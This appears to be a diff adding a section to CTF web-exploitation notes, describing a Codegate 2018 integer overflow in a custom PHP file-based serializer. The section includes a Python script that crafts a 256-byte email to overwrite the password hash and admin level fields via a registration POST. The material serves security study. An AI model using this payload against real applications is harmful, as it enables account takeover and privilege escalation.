@@ -14,6 +14,7 @@
 - [date -f Arbitrary File Read (Can-CWIC 2017)](#date--f-arbitrary-file-read-can-cwic-2017)
 - [Apache mod_rewrite PATH_INFO Bypass (EKOPARTY 2017)](#apache-mod_rewrite-path_info-bypass-ekoparty-2017)
 - [PHP ReDoS to Skip Code Execution (CODE BLUE 2017)](#php-redos-to-skip-code-execution-code-blue-2017)
+- [Custom Serializer Integer Overflow 256 to 0 Length (Codegate 2018)](#custom-serializer-integer-overflow-256-to-0-length-codegate-2018)
 - [Pickle Chaining via STOP Opcode Stripping (VolgaCTF 2013)](#pickle-chaining-via-stop-opcode-stripping-volgactf-2013) *(stub — see [server-side-deser.md](server-side-deser.md))*
 - [Java Deserialization (ysoserial)](#java-deserialization-ysoserial) *(stub — see [server-side-deser.md](server-side-deser.md))*
 - [Python Pickle Deserialization](#python-pickle-deserialization) *(stub — see [server-side-deser.md](server-side-deser.md))*
@@ -458,6 +459,79 @@ ADMIN--(###A)*  repeated 20+ times
 ```
 
 **Key insight:** PHP ReDoS can skip subsequent code entirely — a timed-out `preg_match()` returns `false` (not `0`), and any code gated on that check (like an ACL table INSERT) is silently skipped. This is not just a DoS: it acts as a code execution bypass when missing side effects change application security state.
+
+---
+
+## Custom Serializer Integer Overflow 256 to 0 Length (Codegate 2018)
+
+**Pattern:** A custom PHP file-based database stores records with a format of `<type_byte><length_byte><data>` per field. The length is stored in a single byte (`chr(len)`). When a field value is exactly 256 bytes, `chr(256)` wraps to `\x00` (null byte), making the parser treat the length as 0. The remaining 256 bytes of data spill into subsequent field boundaries, allowing the attacker to overwrite fields like password hash or privilege level.
+
+```python
+import hashlib
+import requests
+
+# Custom DB format per field: \x01 (string type) + chr(length) + data
+# Fields stored in order: email, ip, level
+# Goal: overwrite the password hash and level fields by overflowing email
+
+# Craft the payload to inject into the "email" field
+target_password = "hacked"
+pw_hash = hashlib.md5(target_password.encode()).hexdigest()  # 32 hex chars
+
+# These are the fields we want to inject after the overflow
+injected_mail = '\x01\x20' + pw_hash          # type=string, len=32, data=md5(pw)
+injected_level = '\x01\x01' + '2'             # type=string, len=1, data='2' (admin)
+
+# Calculate padding to make total email field exactly 256 bytes
+overhead = len(injected_mail) + len(injected_level) + 2  # +2 for the ip field header
+pad_len = 256 - overhead
+injected_ip = '\x01' + chr(pad_len) + 'A' * pad_len  # type=string, padded ip field
+
+# Combine: mail_data + ip_data + level_data = 256 bytes total
+# When stored as email field: chr(256) = chr(0) = \x00 → length = 0
+# Parser reads 0 bytes for email, then the 256 bytes become the next fields
+payload_email = injected_mail + injected_ip + injected_level
+
+# Register with the overflow payload as the email
+r = requests.post("http://target/register", data={
+    "email": payload_email,
+    "password": target_password,
+    "username": "attacker"
+})
+print(r.text)
+```
+
+```text
+# How the overflow works in the file-based DB:
+
+# Normal record layout:
+# [email_type][email_len][email_data][ip_type][ip_len][ip_data][level_type][level_len][level_data]
+#   \x01       \x10       user@x.com   \x01    \x09   127.0.0.1  \x01       \x01       1
+
+# Overflow: email is 256 bytes → chr(256) = \x00
+# [email_type][0x00][...256 bytes of attacker data...]
+#   \x01       \x00  ← parser reads 0 bytes for email
+#                    ← the 256 bytes are now parsed as ip, level, etc.
+#                    ← attacker controls password hash and level fields
+```
+
+```python
+# Generalized overflow finder for custom serialization formats
+def find_overflow_length(field_width_bytes):
+    """
+    Calculate the overflow value for N-byte length fields.
+    1 byte: overflows at 256 → 0
+    2 bytes: overflows at 65536 → 0
+    """
+    return 2 ** (8 * field_width_bytes)
+
+# 1-byte length: 256 → 0
+assert find_overflow_length(1) == 256
+# 2-byte length: 65536 → 0
+assert find_overflow_length(2) == 65536
+```
+
+**Key insight:** Single-byte length fields overflow at 256 to 0, letting data from one field spill into subsequent fields. Any custom serialization format using fixed-width length fields is vulnerable. Look for field length stored in 1 byte (max 255) or 2 bytes (max 65535). Signs of custom serialization: binary file-based databases, custom session formats, proprietary protocol parsers. The attack requires knowing (or guessing) the exact field order and format in the serialized structure. See also [server-side-deser.md](server-side-deser.md) for standard deserialization attacks.
 
 ---
 
